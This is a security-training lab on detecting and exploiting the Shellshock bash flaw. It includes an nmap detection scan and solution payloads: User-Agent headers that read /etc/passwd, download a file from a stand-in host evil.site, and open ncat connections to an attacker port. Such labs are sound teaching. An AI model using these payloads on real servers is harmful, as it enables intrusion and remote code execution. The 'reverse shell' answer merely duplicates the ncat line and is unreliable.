## Studying Shellshock

In this activity, you will learn how to: 

- Identify if a server is vulnerable to Shellshock.
- Write custom Shellshock payloads.
- Articulate which HTTP headers can serve as command injection points.

### Instructions

- Find a tool that determines if a server is vulnerable to Shellshock.
    
    **Hint**: Research Nmap scripts: <https://nmap.org/nsedoc/>.
    
    > **Solution**: Use `http-shellshock`. See below for example usage.
    > ```bash
    > $ nmap -sV -p- --script http-shellshock 172.16.0.2
    > 
    >   PORT   STATE SERVICE REASON
    >   80/tcp open  http    syn-ack
    >   http-shellshock:
    >     VULNERABLE:
    >     HTTP Shellshock vulnerability
    >       State: VULNERABLE (Exploitable)
    >       IDs:  CVE:CVE-2014-6271
    >         This web application might be affected by the vulnerability known as Shellshock. It seems the server is executing commands injected via malicious HTTP headers.
    > 
    >     |Disclosure date: 2014-09-24
    >     |References:
    >      http://www.openwall.com/lists/oss-security/2014/09/24/10
    >      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
    >      http://seclists.org/oss-sec/2014/q3/685
    >      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
    > ```

- Write Shellshock payloads that:
    - Read `/etc/passwd`
    - Use `curl` to download a malicious file from `http://evil.site/mal.php`
    - Open an Ncat connection to your port 4444.
    - Send a reverse shell to your port 4444.

    **Solution**
    >   - `User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'`
    >   - `User-Agent: () { :;}; /bin/bash -c 'cd /tmp && curl -O http://evil.site/mal.php'`
    >   - `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.5 4444'`
    >   - `User-Agent: () { :;}; /bin/bash -c 'ncat 192.168.0.5 4444'`
    
- Refer to the following Wikipedia article on CGI. Scroll down to **Request specific variables**: <https://en.wikipedia.org/wiki/Common_Gateway_Interface#Example>
    
    - The examples demonstrated command injection via the `User-Agent` header. Which other headers are vulnerable?

    **Solution**: Any other header loaded by the environment is vulnerable.  This includes all of the standard header variables, such as `HTTP_HOST`, `HTTP_COOKIE`, `HTTP_ACCEPT`, etc., as well as variables like `SCRIPT_PROTOCOL` (via HTTP version injection).
